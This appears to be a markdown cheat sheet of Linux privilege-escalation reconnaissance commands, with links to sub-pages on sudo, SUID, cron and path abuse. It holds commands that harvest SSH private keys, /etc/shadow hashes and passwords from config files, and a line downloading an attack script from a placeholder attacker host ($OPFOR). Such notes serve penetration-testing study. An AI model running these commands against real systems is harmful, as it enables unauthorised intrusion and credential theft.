[Linux Privilege Escalation - Recon](#linux-privilege-escalation---recon)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Users, Processes, & Directory Enumeration](#user--process-enumeration)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Current User](#User)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Other Users](#Other-Users)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[SUID & SGID](#suid--sgid)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Passwords & Hashes](#passwords--hashes)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Processes](#processes)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Services, Packages, & Binaries](#services-packages--binaries)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Writable Directories & Files](#writable-directories--files)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Interesting Directories & Files](#interesting-directories--files)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[System & Environment Enumeration](#system--environment-enumeration)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[System Information](#system-information)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Network Information](#network-information)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[File Systems, Drives, & Peripherals](#file-systems-drives--peripherals)<br/>

[Linux Privilege Escalation - Techniques](#linux-privilege-escalation---techniques)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Permissions-based Privilege Escalation](#permissions-based-privilege-escalation)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Sudo Abuse](#sudo-abuse)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[SUID & SGID](#suid--sgid)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;[Environmental-based Privilege Escalation](#environmental-based-privilege-escalation)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Path Abuse](#path-abuse)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Wildcard Abuse](#wildcard-abuse)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Restricted Shell Escape](#restricted-shell-escape)<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Containers](#containers)<br/>

# Linux Privilege Escalation - Recon

## User & Process Enumeration

### Current User

```bash
cat /etc/shells # Available login shells
```

```bash
whoami # Get current user context
id # what groups does the user belong to
ls -all ~/.ssh 	# Check for SSH keys for current user
lastlog # check user's last login time
```

```bash
sudo -l	# Can the user run anything as another user?
```

See: [Sudo Abuse](sudo.md)

```bash
history	# Check the current user's bash history
tail -n5 /home/*/.bash* # Check current user's bash history
echo $PATH # Check the current user's PATH variable contents
env # Check environmental vars for the user, may find a password
cat .bashrc # Check if custom vars found
```

### Other Users

```bash
ls -alh /home	# View user home directories. Check .bash_history & .ssh/ for keys
cat /etc/passwd | cut -f1 -d: # get all users from /etc/passwd
ps au # See logged in users
w # see logged in users
finger # see logged in users
```
```bash
cat /etc/group # view groups
getent group sudo # get the members of ANY group, e.g. sudo
```
```bash
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1" # SSH private keys
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1" # SSH public keys
```
```bash
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null # find history files
find . -print | sed -e 's;[^/]*/;|;g;s;|; |;g' # Local file enum
```

### SUID & SGID

```bash
wget http://$OPFOR:$port/lin/suid3num.py
chmod +x suid3num.py
python3 suid3num.py

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null	# Find binaries with the SUID bit set. The file will execute with the privileges of the file group.

find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null	# Find binaries with the SETGID bit set. The file will execute with the privilege of the file owner.
```

### Passwords & Hashes

```bash
cat /etc/passwd # file is readable by all users, sometimes a hash will be in here. If we have the shadow file, too, then we can crack the hashes
cat /etc/shadow # if readable, then hashes for all users will be available to crack
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
grep 'DB_USER\|DB_PASSWORD' wp-config.php # Look for credentials
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null # Look for credentials 
```

### Processes

```bash
ps au
ps aux | grep root	# See processes running as root
ps aux | grep $user # See processes running as $user
ls -la /etc/cron.daily # Check for daily Cron jobs
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null # Find world-writeable directories. Interesting dirs could be used by cron jobs that can be exploited
./pspy64 -pf -i 1000	# View running processes with pspy. -pf print cmds and -i 1000 refresh every 1000/ms (every second)
```

### Services, Packages, & Binaries

```bash
sudo -V # Check sudo version to see if vulnerable to exploit
ls -l /bin /usr/bin/ /usr/sbin/ # View binaries
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list # Create a list of installed packages
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done # Search GTFObins for installed package list created above
strace ping -c1 10.129.112.20 # track and analyze system calls and signal processing. It allows us to follow the flow of a program and understand how it accesses system resources, processes signals, and receives and sends data from the operating system
```

### Writable Directories & Files

```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null	# Find world-writeable directories. Interesting dirs could be used by cron jobs that can be exploited
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null	# Find world-writeable files
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null	# Search for config files
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null # Get all readable config files
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep username # All hidden files for $username
find / -type d -name ".*" -ls 2>/dev/null # All hidden directories
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share" # Search for scripts
```

### Interesting Directories & Files

```bash
find . -print | sed -e 's;[^/]*/;|;g;s;|; |;g'

for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# look in /home
# look in app directories like
# /var/www

# look for DB files

ls -l /tmp /var/tmp /dev/shm # View temporary files
/tmp # Data stored for up to 10 days or upon device restart
/var/tmp # Data stored for up to 30 days
```
```bash
# find config files
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# search for creds
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

# find DB files
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

# search for .txt and extensionless files for notes
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# search for scripts
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

## System & Environment Enumeration

### System Information

```bash
hostname
cat /etc/os-release # Check the OS version
cat /etc/lsb-release	# Check the OS version
uname -a	# Check the Kernel version
cat /proc/version # Check the Kernal version
lscpu # Check the CPU type/version
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n" #  used to look up system information such as the state of running processes, kernel parameters, system memory, and devices. It also sets certain system parameters, such as process priority, scheduling, and memory allocation.
```

### Network Information

```bash
ip a # check subnets and NICs
ifconfig # check subnets and NICs
route # routing table
netstat -rn # routing table
arp -a # Check what other hosts the system has been communicating with
cat /etc/hosts # local DNS entries
```

### File Systems, Drives, & Peripherals

```bash
df -h # View mounted file systems. Root required to mount/unmount drives.
lsblk	# Check for unmounted file systems/drives. If you discover and can mount an additional drive or unmounted file system, you may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.
cat /etc/fstab # search for 'password' 'username', 'credential' by grepping. Used for mounted drives
cat /etc/fstab | grep -v password # example
lpstat # Check for any attached printers for potential interesting info
cat /etc/fstab | grep -v "#" | column -t # View unmounted file systems
```
# Linux Privilege Escalation - Techniques

## Permissions-based Privilege Escalation

### Sudo Abuse

[Sudo Abuse](sudo.md)

### SUID & SGID Abuse

[SUID & SGID Abuse](suid--sgid-abuse.md)

### Prilileged Groups

[Privileged Groups](privileged-groups.md)

### Special File Capabilities

[Special File Capabilities](special-file-capabilities.md)

### Cron Job Abuse

[Cron Job Abuse](cron-job-abuse.md)


## Environmental-based Privilege Escalation

### Path Abuse

[Path Abuse](path-abuse.md)

### Wildcard Abuse

[Wildcard Abuse](wild-card-abuse.md)

### Restricted Shell Escape

https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/escaping-from-limited-bash

```text
Common Ristricted Shells
* rbash - most restrictive
* rksh - moderately restrictive
* rzsh - most flexible
```

### Containers

[Containers](containers.md)